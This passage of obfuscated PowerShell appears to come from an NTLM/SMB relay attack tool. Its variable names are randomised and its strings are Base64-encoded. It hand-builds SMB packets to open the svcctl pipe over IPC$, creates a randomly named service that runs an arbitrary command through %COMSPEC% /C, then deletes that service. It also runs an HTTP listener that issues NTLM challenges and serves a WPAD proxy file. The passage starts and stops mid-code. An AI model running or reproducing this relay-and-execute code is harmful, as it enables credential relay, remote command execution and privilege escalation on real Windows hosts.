        ${123670e95dd5433ba0d22477e03b613e} = ${123670e95dd5433ba0d22477e03b613e}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        [Array]::Reverse(${123670e95dd5433ba0d22477e03b613e})
        ${b632751a445643d8bf68e13cb639cb7e} = 0
        :SMB_relay_response_loop while (${b632751a445643d8bf68e13cb639cb7e} -lt 1)
        {
            ${1283158905f04a3e948b0b04bbc144e8} = 0x00,0x00 +
                                       ${123670e95dd5433ba0d22477e03b613e} +
                                       0xff,0x53,0x4d,0x42,0x73,0x00,0x00,0x00,0x00,0x18,0x03,0xc8,0x00,0x00,
                                       0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff +
                                       ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                       ${d4fc511a0ea649629576cc7af60e82cd} +
                                       0x00,0x00,0x0c,0xff,0x00,0x00,0x00,0xff,0xff,0x02,0x00,0x01,0x00,0x00,
                                       0x00,0x00,0x00 +
                                       ${609383709906436d8548f7db689baa28} +
                                       0x00,0x00,0x00,0x00,0x44,0x00,0x00,0x80 +
                                       ${e9298dcb5b5643af8ff9bfd3f7c902b7} +
                                       ${c4394dc631b049e599bb2eddbecb2fdc} +
                                       0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,
                                       0x00,0x00,0x00,0x6a,0x00,0x43,0x00,0x49,0x00,0x46,0x00,0x53,0x00,0x00,
                                       0x00
            ${d9c02276587a41a7814a4ddf79c8e893}.Write(${1283158905f04a3e948b0b04bbc144e8},0,${1283158905f04a3e948b0b04bbc144e8}.Length)
        	${d9c02276587a41a7814a4ddf79c8e893}.Flush()
            ${d9c02276587a41a7814a4ddf79c8e893}.Read(${ec9e722b7a1f4dc5b05746dcb551ea3b},0,${ec9e722b7a1f4dc5b05746dcb551ea3b}.Length)
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 2
            ${b632751a445643d8bf68e13cb639cb7e}++
        }
        return ${ec9e722b7a1f4dc5b05746dcb551ea3b}
    }
}
${eac4f1430af64f768baa9e4282666b4e} =
{
    function a8badc65df47466dbd149e72dd51242c
    {
        param (${c47b7e6f72f84caa846eae38219512af},${d4fc511a0ea649629576cc7af60e82cd})
        if (${c47b7e6f72f84caa846eae38219512af})
        {
            ${b3ffcb06208e4485b12f2fa044cec0e4} = ${c47b7e6f72f84caa846eae38219512af}.GetStream()
        }
        ${76bba80cf42c4a2e9c0c4de90e4b4df9} = $false
        ${1641aee81e4b44238f7320d98b28819f} = New-Object System.Byte[] 1024
        ${cd1a9c05090449ea9e29c97637f01464} = [String]::Join($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0A'))), (1..20 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQA='))) -f (Get-Random -Minimum 65 -Maximum 90)}))
        ${92fc317a42924482acd0da79b28c1e35} = ${cd1a9c05090449ea9e29c97637f01464} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${92fc317a42924482acd0da79b28c1e35} = ${92fc317a42924482acd0da79b28c1e35}.Substring(0,${92fc317a42924482acd0da79b28c1e35}.Length-1)
        ${92fc317a42924482acd0da79b28c1e35} = ${92fc317a42924482acd0da79b28c1e35}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${92fc317a42924482acd0da79b28c1e35} = New-Object System.String (${92fc317a42924482acd0da79b28c1e35},0,${92fc317a42924482acd0da79b28c1e35}.Length)
        ${cd1a9c05090449ea9e29c97637f01464} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAA==')))
        [Byte[]] ${1ba8a2c4aac94322b31ead81b76b5078} = ${cd1a9c05090449ea9e29c97637f01464}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${138b6ea3b0b341b5b4ff763245a535cc} = [String](1..4 | %{$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
        ${138b6ea3b0b341b5b4ff763245a535cc} = ${138b6ea3b0b341b5b4ff763245a535cc}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
        $Command = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBDAE8ATQBTAFAARQBDACUAIAAvAEMAIAAiAA=='))) + $Command + "`""
        [System.Text.Encoding]::UTF8.GetBytes($Command) | %{ ${52e8e86f666a445eaefb3fa5508aa4e2} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0ALQAwADAALQA='))) -f $_ }
        if([Bool]($Command.Length % 2))
        {
            ${52e8e86f666a445eaefb3fa5508aa4e2} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAA==')))
        }
        else
        {
            ${52e8e86f666a445eaefb3fa5508aa4e2} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))
        }    
        [Byte[]] ${65df4525325f48138c01c8ad746f6e72} = ${52e8e86f666a445eaefb3fa5508aa4e2}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${8621f8f63e814627aa6b2d1a2a49ca66} = [System.BitConverter]::GetBytes(${65df4525325f48138c01c8ad746f6e72}.Length + ${1ba8a2c4aac94322b31ead81b76b5078}.Length + 237)
        ${8621f8f63e814627aa6b2d1a2a49ca66} = ${8621f8f63e814627aa6b2d1a2a49ca66}[2..0]
        ${0a218a49ba144b579d03a345bd878c60} = [System.BitConverter]::GetBytes(${65df4525325f48138c01c8ad746f6e72}.Length + ${1ba8a2c4aac94322b31ead81b76b5078}.Length + 174)
        ${0a218a49ba144b579d03a345bd878c60} = ${0a218a49ba144b579d03a345bd878c60}[0..1]   
        ${a80ba646ee364e619f7dd7d2b5d3b31c} = [System.BitConverter]::GetBytes(${65df4525325f48138c01c8ad746f6e72}.Length / 2)
        ${005420930279405cbffa7366e2517a33} = 0
        :SMB_relay_execute_loop while (${005420930279405cbffa7366e2517a33} -lt 12)
        {
            switch (${005420930279405cbffa7366e2517a33})
            {
                0
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x45,0xff,0x53,0x4d,0x42,0x75,0x00,0x00,0x00,0x00,
                                              0x18,0x01,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0xff,0xff +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x00,0x00,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,
                                              0x00,0x5c,0x5c,0x31,0x30,0x2e,0x31,0x30,0x2e,0x32,0x2e,0x31,0x30,
                                              0x32,0x5c,0x49,0x50,0x43,0x24,0x00,0x3f,0x3f,0x3f,0x3f,0x3f,0x00
                }
                1
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x5b,0xff,0x53,0x4d,0x42,0xa2,0x00,0x00,0x00,0x00,
                                              0x18,0x02,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,
                                              0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00
                }
                2
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00,0x00,0x00,0x48,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,
                                              0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,
                                              0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
                                              0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,
                                              0x00,0x10,0x03,0x02,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,
                                              0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,
                                              0x00
                    ${420a20c1dda041fa9b73b8fcd0894a62} = 0x05
                }
                3
                { 
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = ${ae497c364abc4fd6b4f5adef8499a4f3}
                }
                4
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x9b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x50,0x00,0x00,0x00,0x5c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x5c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x5c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,
                                              0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03,0x00,0x15,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${1ba8a2c4aac94322b31ead81b76b5078} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00
                    ${420a20c1dda041fa9b73b8fcd0894a62} = 0x07
                }
                5
                {  
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = ${ae497c364abc4fd6b4f5adef8499a4f3}
                }
                6
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = [Array]0x00 +
                                              ${8621f8f63e814627aa6b2d1a2a49ca66} +
                                              0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00 +
                                              ${0a218a49ba144b579d03a345bd878c60} +
                                              0x00,0x00 +
                                              ${0a218a49ba144b579d03a345bd878c60} +
                                              0x3f,0x00,0x00,0x00,0x00,0x00 +
                                              ${0a218a49ba144b579d03a345bd878c60} +
                                              0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00 +
                                              ${0a218a49ba144b579d03a345bd878c60} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,
                                              0x00 +
                                              ${2e08d906c0874e9e8fed7f63f8ba7511} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${1ba8a2c4aac94322b31ead81b76b5078} +
                                              0x00,0x00 +
                                              ${138b6ea3b0b341b5b4ff763245a535cc} +
                                              0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x15,0x00,0x00,0x00 +
                                              ${1ba8a2c4aac94322b31ead81b76b5078} +
                                              0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00 +
                                              ${a80ba646ee364e619f7dd7d2b5d3b31c} +
                                              0x00,0x00,0x00,0x00 +
                                              ${a80ba646ee364e619f7dd7d2b5d3b31c} +
                                              ${65df4525325f48138c01c8ad746f6e72} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00
                    ${420a20c1dda041fa9b73b8fcd0894a62} = 0x09
                }
                7
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = ${ae497c364abc4fd6b4f5adef8499a4f3}
                }
                8
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x34,0x00,0x00,0x00,0x34,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,
                                              0x00,0x00,0x00,0x13,0x00 +
                                              ${2e08d906c0874e9e8fed7f63f8ba7511} +
                                              0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                }
                9
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = ${ae497c364abc4fd6b4f5adef8499a4f3}
                }
                10
                { 
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = 0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,
                                              0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                              0x00,0x00,0x00,0x08 +
                                              ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                              ${d4fc511a0ea649629576cc7af60e82cd} +
                                              0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,
                                              0xff,0xff,0xff,0xff,0x08,0x00,0x2c,0x00,0x00,0x00,0x2c,0x00,0x3f,
                                              0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,
                                              0x00,0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,
                                              0x00,0x00,0x00,0x02,0x00 +
                                              ${2e08d906c0874e9e8fed7f63f8ba7511}
                }
                11
                {
                    ${6eee5ecfd4ed437da3e652d96b34c6ed} = ${ae497c364abc4fd6b4f5adef8499a4f3}
                }
            }
            ${b3ffcb06208e4485b12f2fa044cec0e4}.Write(${6eee5ecfd4ed437da3e652d96b34c6ed},0,${6eee5ecfd4ed437da3e652d96b34c6ed}.Length)
            ${b3ffcb06208e4485b12f2fa044cec0e4}.Flush()
            if (${005420930279405cbffa7366e2517a33} -eq 5) 
            {
                ${b3ffcb06208e4485b12f2fa044cec0e4}.Read(${1641aee81e4b44238f7320d98b28819f},0,${1641aee81e4b44238f7320d98b28819f}.Length)
                ${2e08d906c0874e9e8fed7f63f8ba7511} = ${1641aee81e4b44238f7320d98b28819f}[88..107]
                if(([System.BitConverter]::ToString(${1641aee81e4b44238f7320d98b28819f}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))) -and ([System.BitConverter]::ToString(${2e08d906c0874e9e8fed7f63f8ba7511}) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA==')))))
                {
                }
                elseif([System.BitConverter]::ToString(${1641aee81e4b44238f7320d98b28819f}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - ${249913aa82a043239a9f2ba571b40e5e}\" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAZQBlAGUAMwBiADUAMABhADQANgBiADQANwBhADEAYQBjADMAMgAyADEAMAA0ADcAOQA1ADYAOAA1AGEAZQB9ACAAaQBzACAAbgBvAHQAIABhACAAbABvAGMAYQBsACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAG8AbgAgAA=='))) + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADQAYQBkAGUANgBlAGMAYgAwADUANwBhADQAOQA2ADMAYgBhADAAMwAzAGUANAAzADQANAA1ADgAZgBiADUAMwB9AA=='))))
                    ${76bba80cf42c4a2e9c0c4de90e4b4df9} = $true
                }
                else
                {
                    ${76bba80cf42c4a2e9c0c4de90e4b4df9} = $true
                }
            }
            elseif (${005420930279405cbffa7366e2517a33} -eq 7 -or ${005420930279405cbffa7366e2517a33} -eq 9 -or ${005420930279405cbffa7366e2517a33} -eq 11)
            {
                ${b3ffcb06208e4485b12f2fa044cec0e4}.Read(${1641aee81e4b44238f7320d98b28819f},0,${1641aee81e4b44238f7320d98b28819f}.Length)
                switch(${005420930279405cbffa7366e2517a33})
                {
                    7 {
                        ${2e08d906c0874e9e8fed7f63f8ba7511} = ${1641aee81e4b44238f7320d98b28819f}[92..111]
                        ${0407aae808f34ce7882a896db7539508} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGMAcgBlAGEAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    11 {
                        ${0407aae808f34ce7882a896db7539508} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAHMAdABhAHIAdAAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                    13 {
                        ${0407aae808f34ce7882a896db7539508} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAGQAZQBsAGUAdABpAG8AbgAgAGYAYQB1AGwAdAAgAGMAbwBuAHQAZQB4AHQAIABtAGkAcwBtAGEAdABjAGgA')))
                    }
                }
                if([System.BitConverter]::ToString(${2e08d906c0874e9e8fed7f63f8ba7511}[0..3]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                {
                    ${76bba80cf42c4a2e9c0c4de90e4b4df9} = $true
                }
                if([System.BitConverter]::ToString(${1641aee81e4b44238f7320d98b28819f}[88..91]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBhAC0AMAAwAC0AMAAwAC0AMQBjAA=='))))
                {
                    ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAANAAwADcAYQBhAGUAOAAwADgAZgAzADQAYwBlADcAOAA4ADIAYQA4ADkANgBkAGIANwA1ADMAOQA1ADAAOAB9ACAAcwBlAHIAdgBpAGMAZQAgAG8AbgAgACQAewA0AGEAZABlADYAZQBjAGIAMAA1ADcAYQA0ADkANgAzAGIAYQAwADMAMwBlADQAMwA0ADQANQA4AGYAYgA1ADMAfQA='))))
                    ${76bba80cf42c4a2e9c0c4de90e4b4df9} = $true
                }
            }        
            else
            {
                ${b3ffcb06208e4485b12f2fa044cec0e4}.Read(${1641aee81e4b44238f7320d98b28819f},0,${1641aee81e4b44238f7320d98b28819f}.Length)    
            }
            if(!${76bba80cf42c4a2e9c0c4de90e4b4df9} -and ${005420930279405cbffa7366e2517a33} -eq 7)
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - SMB relay service ${92fc317a42924482acd0da79b28c1e35} created on ${4ade6ecb057a4963ba033e434458fb53}")
            }
            elseif(!${76bba80cf42c4a2e9c0c4de90e4b4df9} -and ${005420930279405cbffa7366e2517a33} -eq 9)
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Command likely executed on ${4ade6ecb057a4963ba033e434458fb53}")
            }
            elseif(!${76bba80cf42c4a2e9c0c4de90e4b4df9} -and ${005420930279405cbffa7366e2517a33} -eq 11)
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - SMB relay service ${92fc317a42924482acd0da79b28c1e35} deleted on ${4ade6ecb057a4963ba033e434458fb53}")
            }   
            ${ae497c364abc4fd6b4f5adef8499a4f3} = 0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,
                                                0x18,0x05,0x28,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x08 +
                                                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.process_ID_bytes +
                                                ${d4fc511a0ea649629576cc7af60e82cd} +
                                                ${420a20c1dda041fa9b73b8fcd0894a62} +
                                                0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x58,
                                                0x02,0x58,0x02,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00
            if(${76bba80cf42c4a2e9c0c4de90e4b4df9})
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - SMB relay failed on ${4ade6ecb057a4963ba033e434458fb53}")
                BREAK SMB_relay_execute_loop
            }
            ${005420930279405cbffa7366e2517a33}++
        }
        ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMB_relay_active_step = 0
        ${c47b7e6f72f84caa846eae38219512af}.Close()
        if(!${76bba80cf42c4a2e9c0c4de90e4b4df9})
        {
            ${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success = $True
        }
    }
}
${79a178e97b5f4043adf4245fd9c6bc82} = 
{
    param ($Command,$HTTPPort,$WPADDirectHosts,$WPADPort)
    function e97ebf2d2cb04bb1a483226a4f699e33
    {
        ${c0187c7ad61a4726b71732e5924a2603} = Get-Date
        ${c0187c7ad61a4726b71732e5924a2603} = ${c0187c7ad61a4726b71732e5924a2603}.ToFileTime()
        ${c0187c7ad61a4726b71732e5924a2603} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${c0187c7ad61a4726b71732e5924a2603}))
        ${c0187c7ad61a4726b71732e5924a2603} = ${c0187c7ad61a4726b71732e5924a2603}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        ${3022cf89022e48e4b2abbbbbc2e90df3} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,
                           0x00,0x00,0x00,0x05,0xc2,0x89,0xa2 +
                           $HTTP_challenge_bytes +
                           0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,
                           0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00,0x02,0x00,0x06,0x00,
                           0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,
                           0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00,0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,
                           0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,
                           0x00,0x68,0x00,0x6f,0x00,0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
                           0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,
                           0x00,0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,
                           0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00 +
                           ${c0187c7ad61a4726b71732e5924a2603} +
                           0x00,0x00,0x00,0x00,0x0a,0x0a
        ${dc93213473994c2985303b888218f68b} = [System.Convert]::ToBase64String(${3022cf89022e48e4b2abbbbbc2e90df3})
        ${6efafeef899c405dabd479f39fb81ce4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${dc93213473994c2985303b888218f68b}
        ${f78220a4f00b411f804d5d237d582aeb} = $HTTP_challenge
        return ${6efafeef899c405dabd479f39fb81ce4}
    }
    ${4ade6ecb057a4963ba033e434458fb53} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAyADcALgAwAC4AMAAuADEA')))
    ${34258eb257cf43f3ac1c9108abfc161e} = [System.Text.Encoding]::UTF8.GetBytes($HTTPPort)
    $WPADDirectHosts += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA')))
    ${eab780a35922483299e19b17ad7e983e} = $WPADPort.Length + 62
    foreach(${c579068a51514a12af31d42c77eb0f53} in $WPADDirectHosts)
    {
        ${eab780a35922483299e19b17ad7e983e} += ${c579068a51514a12af31d42c77eb0f53}.Length + 43
        ${2470f9be8e264d7d846b087ef9b50ab9} = [System.Text.Encoding]::UTF8.GetBytes(${eab780a35922483299e19b17ad7e983e})
        ${b78c43c1c2474a0ab96ad9c165132ee6} = [System.Text.Encoding]::UTF8.GetBytes(${c579068a51514a12af31d42c77eb0f53})
        ${6b98283c0c484ab68ea3d7c132627262} = 0x69,0x66,0x20,0x28,0x64,0x6e,0x73,0x44,0x6f,0x6d,0x61,0x69,0x6e,0x49,
                                           0x73,0x28,0x68,0x6f,0x73,0x74,0x2c,0x20,0x22 +
                                           ${b78c43c1c2474a0ab96ad9c165132ee6} +
                                           0x22,0x29,0x29,0x20,0x72,0x65,0x74,0x75,0x72,0x6e,0x20,0x22,0x44,0x49,
                                           0x52,0x45,0x43,0x54,0x22,0x3b 
        ${3b9c0e49cf9f4d629fdf22ba17aa1451} += ${6b98283c0c484ab68ea3d7c132627262}
    }
    ${f5f0632351c44148b873f95e81bea80a} = [System.Text.Encoding]::UTF8.GetBytes($WPADPort)
    :HTTP_listener_loop while (${0692fe0f3fb24e1eaab3d7ebe23d6789}.running)
    {
        if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
        {
            bab42ea23cbf4b21a92a6b346d944321
        }
        ${955b892ed7df4fb89cdbcb3e1f1836e9} = $NULL
        ${3ef2d1c57b1042539bc7268bf5abe5ee} = New-Object System.Byte[] 1024
        ${a24aacbcf4e94931bc2e84c8991a0d53} = $false
        while(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_listener.Pending() -and !${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Connected)
        {
            if(!${a24aacbcf4e94931bc2e84c8991a0d53})
            {
                ${0692fe0f3fb24e1eaab3d7ebe23d6789}.console_queue.Add("$(Get-Date -format 's') - Waiting for incoming HTTP connection")
                ${a24aacbcf4e94931bc2e84c8991a0d53} = $true
            }
            sleep -s 1
            if(${0692fe0f3fb24e1eaab3d7ebe23d6789}.SMBRelay_success)
            {
                bab42ea23cbf4b21a92a6b346d944321
            }
        }
        if(!${0692fe0f3fb24e1eaab3d7ebe23d6789}.HTTP_client.Connected)
        {
